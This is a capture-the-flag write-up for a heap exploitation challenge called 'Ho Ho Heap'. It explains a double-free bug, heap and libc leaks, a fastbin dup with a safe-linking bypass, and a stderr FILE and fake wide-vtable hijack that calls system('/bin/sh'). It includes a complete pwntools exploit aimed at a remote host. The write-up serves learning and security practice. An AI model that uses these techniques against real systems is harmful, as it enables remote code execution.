# Hex Advent 2025 — Ho Ho Heap

**Category:** Pwn  
**Level:** Hard

---

## Summary of Program and Key Notes

This challenge was my first double‑free heap exploit. We are given a binary, and by reversing it in Ghidra, we can understand its structure and the operations available. For clarity, whenever I refer to “gift A”, “gift B”, etc., it only labels the creation order — the actual program does not take an index argument for creation.

Below is a rewritten reference version of the program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void *gift_pointers[256] = {0};
unsigned int gift_size[256] = {0};
int gift_given[256] = {0};
void *sent_gifts_pointer[256] = {0};
int gifts_created = 0;

void add_gift(size_t size) { ... }
void view_gift(int idx) { ... }
void edit_gift(int idx) { ... }
void remove_gift(int idx) { ... }
void send_gift(int idx, int count) { ... }
void send_all_gifts(int last_index_scanned) { ... }
```

### Key Observations

- `gift_pointers[]` stores heap allocations.  
- `gift_size[]` stores their size.  
- `gift_given[]` tracks whether a gift has been sent.  
- `sent_gifts_pointer[]` stores pointers copied when gifts are sent.

**Important Bug:** `send_all_gifts()` frees pointers in `sent_gifts_pointer[]` **without checking per-gift state**, allowing double free vulnerabilities.

---

## 1. Heap Leak via Use-After-Free

We can leak heap memory because `view_gift(idx)` only checks that `gift_pointers[idx]` exists. A freed chunk may still be referenced in `gift_pointers[]` while being freed through `send_all_gifts()`.

**Example sequence for heap leak:**

```python
add_gift(A)
add_gift(B)
send_gift(B)
send_all_gifts()
remove_gift(A)
view_gift(B)  # leaks heap pointer in tcache fd
```

This exposes the forward pointer (fd) in tcache, giving a heap address for further exploitation.

---

## 2. Arbitrary Write via Double Free / Fastbins

### Exploitation Concept

- Tcache has double-free protection; fastbins only check consecutive duplicates.
- Goal: create fastbin list like `A -> B -> A`.
- Achieved by using `gift_pointers[]` and `sent_gifts_pointer[]` to duplicate pointers.

### Steps

1. Allocate gift A (`memA`) and gift B (`memB`).
2. Send gifts and manipulate `sent_gifts_pointer[]`.
3. Free in controlled order using `send_all_gifts()` to populate fastbins:
   ```text
   fastbins_head -> memA -> memB -> memA
   ```
4. Allocate new gifts to consume tcache and control fastbin allocation.
5. Overwrite forward pointer in fastbin to a target address.
6. Next allocation returns chunk at the controlled address, giving arbitrary write.

**Note:** Safe-linking requires knowing a heap leak to correctly encode fd pointer: `encoded_fd = target_address ^ (chunk_address >> 12)`.

---

## 3. Libc Leak

- Freeing a large chunk moves it to the unsorted bin.
- `fd` pointer in unsorted bin points to `main_arena` in libc.
- Sequence to leak libc:

```python
# Fill tcache
for i in range(0, 12):
    add_gift(130)
for i in range(1, 8):
    send_gift(i, 1)
send_all_gifts()

# Leak from unsorted bin
send_gift(8, 1)
send_all_gifts()
libc_leak = view_gift(8)
libc_base = libc_leak - main_arena_offset - 0xe0
system = libc_base + 0x53110
```

---

## 4. Fake Wide Vtable Construction

Modern glibc (≥ 2.42) has introduced significantly stricter heap and hook protections. Standard exploitation techniques like overwriting __free_hook or using the classic _IO_FILE vtable are either removed or heavily protected. This makes traditional FILE structure or hook-based attacks largely unviable.

Found a working vuln and good writeup online: https://chovid99.github.io/posts/stack-the-flags-ctf-2022/

Why Wide Vtables?

Wide vtables are associated with wide-character I/O operations in glibc (like fgetwc, fputwc, or _IO_wfile). The integrity checks on wide vtables are weaker compared to standard vtables:
1. They do not require the vtable pointer to point to a legitimate, read-only libc region.
2. The _doallocate function pointer inside the vtable can be redirected to an arbitrary address.
3. This makes wide vtables a viable attack surface for code execution even under modern protections.

The remaining question is: how do we get libc to actually execute our fake vtable?
1. libc performs cleanup routines when the process exits. During this cleanup:
2. Open file streams, including global stderr, are closed.
3. If _wide_data is non-NULL, libc treats the file stream as wide-oriented.
4. libc dereferences _wide_data and invokes function pointers from the wide vtable.

Thus, if we can:
1. Construct a fake wide vtable in a writable heap region,
2. Point _doallocate inside it to system, and
3. Overwrite the stderr FILE structure with necessary flags set and point to our fake wide vtable via _wide_data,

we can hijack execution flow to call system("/bin/sh") indirectly when we exit and libc flushes stderr.

```python
fake_vtable_payload = b"\x00"*0x68 + p64(system)
# Allocate chunk for fake vtable
add_gift(270)
add_gift(270)
send_gift(25,1)
send_all_gifts()
remove_gift(24)
chunk_base = (view_gift(25) << 12)
fake_vtable_addr = chunk_base | 0xcc0
add_gift(270)
add_gift(270, fake_vtable_payload)

# Fake wide data
fake_wide_data_payload = b"\x00" * 0xe0 + p64(fake_vtable_addr)
fake_data_addr = chunk_base | 0xba0
remove_gift(26)
add_gift(270, fake_wide_data_payload)
```

---

## 5. Overwriting stderr and Triggering system("/bin/sh")

- Forge `stderr` FILE structure:
  - `_IO_write_ptr > _IO_write_base`
  - `_wide_data` points to fake wide data
  - vtable points to `_IO_wfile_jumps`

```python
fake_stderr = FileStructure(0)
fake_stderr.flags = u64(b'  sh\x00\x00\x00\x00')
fake_stderr._IO_write_base = 0
fake_stderr._IO_write_ptr = 1
fake_stderr._wide_data = fake_data_addr
fake_stderr.vtable = libc_base + libc.symbols['_IO_wfile_jumps']
fake_stderr._lock = libc_base + 0x1e97a0
fake_stderr_bytes = bytes(fake_stderr)
```

- Split into two halves due to fastbin constraints.
- Use double free exploit to write each half into memory controlled allocations.
- Trigger execution by letting libc flush `stderr` on process exit.

---

## 6. Exploit Execution

```py 
from pwn import *
import time
import os


libc = ELF("./libc.so.6")
p = remote("52.76.163.244", 5555)

def add_gift(size, content='a'):
    p.sendlineafter("Your choice:", "1")  # WAIT for prompt!
    p.sendlineafter("Gift size:", size)
    if int(size) > 0:
        p.sendlineafter("Content:",content)


def view_gift(index):
    p.sendlineafter("Your choice:", "2")
    p.sendlineafter("Gift index:", str(index))
    p.recvuntil("Gift content: ")
    leaked_bytes = p.recv(8)
    p.recvuntil("Success!")
    libc_leak = u64(leaked_bytes)
    print(f"[+] Leaked libc address: {hex(libc_leak)}")
    return libc_leak

def send_gift(index,count):
    p.sendlineafter("Your choice:", "5")
    p.sendlineafter("Gift index:", str(index))
    p.sendlineafter("How many gifts to give:", str(count))

def remove_gift(index):
    p.sendlineafter("Your choice:", "4")
    p.sendlineafter("Gift index:", str(index))
    
def send_all_gifts():
    p.sendlineafter("Your choice:", "6")
def fin():
    p.sendlineafter("Your choice:", "7")



for i in range(0,12):
    print(f"  Gift {i}")
    add_gift("130","\n")
print("\nSending gifts 1-7...")
for i in range(1,8):
    print(f"  Sending gift {i}")
    send_gift(str(i),"1")

# libc leak
send_all_gifts()
send_gift("8","1")
send_all_gifts()
libc_leak=view_gift("8")
main_arena_offset=0x1e7ac0
libc_base=libc_leak - main_arena_offset - 0xe0
free_addr=libc_base+0x1ee1e8
system=libc_base+0x53110

for i in range(12,24):
    add_gift("130","\n")



# create fake wide_vtable
fake_vtable_payload = b"\x00"*0x68 + p64(system)
# get address where fake_vtable_paylaod will be written to 
add_gift("270")
add_gift("270")
send_gift("25","1")
send_all_gifts()
remove_gift("24")
chunk_base = (view_gift("25")<<12)
print(hex(chunk_base))
fake_vtable_addr=chunk_base | 0xcc0
add_gift("270")
add_gift("270",fake_vtable_payload)

# create fake wide data 
fake_wide_data_payload = b"\x00" * 0xe0  + p64(fake_vtable_addr)          
fake_data_addr=chunk_base | 0xba0
remove_gift("26")
add_gift("270",fake_wide_data_payload)

# Forge stderr
fake_stderr                = FileStructure(0)
fake_stderr.flags          = u64(b'  sh\x00\x00\x00\x00')
fake_stderr._IO_write_base = 0
fake_stderr._IO_write_ptr  = 1 # _IO_write_ptr > _IO_write_base
fake_stderr._wide_data     = fake_data_addr
fake_stderr.vtable         = libc_base+libc.symbols['_IO_wfile_jumps']
fake_stderr._lock         = libc_base+0x1e97a0
fake_stderr_bytes = bytes(fake_stderr)

fake_stderr_bytes_first_half = bytes(fake_stderr)[0:119]
fake_stderr_bytes_second_half = bytes(fake_stderr)[128:224]

# leak the heap address to bypass tcache xor protection
add_gift("120")
add_gift("120")
send_gift("30","1")
send_all_gifts()
remove_gift("29")
heap_xor_leak = view_gift("30") 

# use double free exploit to write first half of stderr
add_gift("120")
add_gift("120")
add_gift("120")
remove_gift("33")
add_gift("120")
send_gift("34","1")
add_gift("120")
send_all_gifts()
add_gift("120")
send_gift("34","1")
send_gift("35","1")
send_gift("36","1")
# prepare fastbins by filling up tcaches 
for i in range(37,44):
    add_gift("120")
for i in range (37,44):
    remove_gift(str(i))
# call send wish to get the double free memories into fastbins
send_all_gifts()
# clear tcache so the next one added is from fastbins
for i in range (44,51):
    add_gift("120")

stderr_addr = libc_base + 0x1e84e0
add_gift("120",p64(stderr_addr^heap_xor_leak))
add_gift("120")
add_gift("120")
add_gift("120",fake_stderr_bytes_first_half)


# leak the heap address to bypass tcache xor protection
add_gift("104")
add_gift("104")
send_gift("56","1")
send_all_gifts()
remove_gift("55")
heap_xor_leak = view_gift("56")
add_gift("104")
add_gift("104")

# use double free exploit to write second half of stderr
add_gift("104")
remove_gift("59")
add_gift("104")
send_gift("60","1")
add_gift("104")
send_all_gifts()
add_gift("104")
send_gift("60","1")
send_gift("61","1")
send_gift("62","1")
# prepare fastbins by filling up tcaches 
for i in range(63,70):
    add_gift("104")
for i in range (63,70):
    remove_gift(str(i))
# call send wish to get the double free memories into fastbins
send_all_gifts()
# clear tcache so the next one added is from fastbins
for i in range (70,77):
    add_gift("104")

add_gift("104",p64((stderr_addr+0x80)^heap_xor_leak))
add_gift("104")
add_gift("104")
add_gift("104",fake_stderr_bytes_second_half)

p.interactive()
```

**Flag Obtained:**
```
HEX{h0_HO_hooOOoO_h34PS_0f_fuN!}
```

---
